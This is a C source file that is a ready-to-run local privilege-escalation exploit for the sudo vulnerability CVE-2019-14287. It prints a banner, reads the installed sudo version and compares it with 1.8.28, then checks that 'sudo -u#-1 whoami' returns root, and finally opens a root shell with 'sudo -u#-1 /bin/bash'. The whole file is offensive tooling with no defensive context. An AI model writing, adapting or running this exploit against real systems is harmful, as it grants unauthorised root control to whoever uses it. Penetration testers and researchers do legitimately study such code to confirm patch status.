//Author : Unam3dd - 04/12/2019
//

#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#define VERSION_PATCH "1828"

void print_banner(){
    char banner[65556];
    strcat(banner,"\033[32m  ██████ ██▒   █▓ █    ██  ██▓     ███▄    █ \n");
    strcat(banner,"▒██    ▒▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █ \n");
    strcat(banner,"░ ▓██▄   ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒\n");
    strcat(banner,"  ▒   ██▒ ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒\n");
    strcat(banner,"▒██████▒▒  ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░\n");
    strcat(banner,"▒ ▒▓▒ ▒ ░  ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒ \n");
    strcat(banner,"░ ░▒  ░ ░  ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░\n");
    strcat(banner,"░  ░  ░      ░░   ░░░ ░ ░   ░ ░      ░   ░ ░\n");
    strcat(banner,"      ░       ░     ░         ░  ░         ░ \n");
    strcat(banner,"             ░                               \n");
    strcat(banner,"               Created By \033[31mUnam3dd\033[32m\n");
    strcat(banner,"               Exploit For \033[31mCVE-2019-14287\033[32m     \n");
    strcat(banner,"               \033[31mSudo Vulnerability\033[32m           \n");
    strcat(banner,"               Github : \033[31mhttps://github.com/Unam3dd\033[00m               \n");
    printf("%s\n",banner);
}

int check_sudo_version(){
    char buffer[4096];
    char buffer2[4096];
    char buffer3[4096];
    FILE *sudo_version = popen("sudo -V","r");
    fgets(buffer,4096,sudo_version);
    char *split_buffer = strtok(buffer,"Sudo version");
    sprintf(buffer2,"%s",split_buffer);
    printf("\033[32m[\033[34m+\033[32m] Version Sudo : %s\n",buffer2);
    char *split_version = strtok(buffer2,".");
    while (split_version !=NULL){
        strcat(buffer3,split_version);
        split_version = strtok(NULL,".");
    }
    int version_integer_code = atoi(buffer3);
    int version_patched = atoi(VERSION_PATCH);
    //printf("My Version is %d",version_integer_code);
    /*if (strcmp(buffer2,"1.8.27\n")==0){
        printf("[-] Vulnerable\n");
    }*/
    if (version_integer_code<version_patched){
        printf("\033[32m[\033[34m+\033[32m] Target is Vulnerable\n");
        return 0;
    }
    else{
        printf("\033[31m[!] Target is Not Vulnerable\n");
        return -1;
        exit(-1);
    }
}

int try_exploit(){
    char buffer_try_exploit[4096];
    printf("\033[32m[\033[34m+\033[32m] Try Exploit...\n");
    FILE *payload = popen("sudo -u#-1 whoami","r");
    fgets(buffer_try_exploit,4096,payload);
    if (strcmp(buffer_try_exploit,"root\n")==0){
        printf("\033[32m[\033[34m+\033[32m] Check Exploit [OK]\n");
        return 0;
    }
    else{
        printf("\033[31m[!] Check Exploit [FAILED]\n");
        return -1;
    }

}

void payload(){
    printf("\033[32m[\033[34m+\033[32m] Injecting Payload...\n");
    printf("\033[32m[\033[34m+\033[32m] Payload Injected !\n");
    printf("\033[32m[\033[34m+\033[32m] Shell with root opened !\n");
    system("sudo -u#-1 /bin/bash"); // -1 = root
}

int main(){
    print_banner();
    if (check_sudo_version() ==0){
        if (try_exploit() ==0)
        {
            payload();
        }
        else{
            exit(-1);
        }
    }
}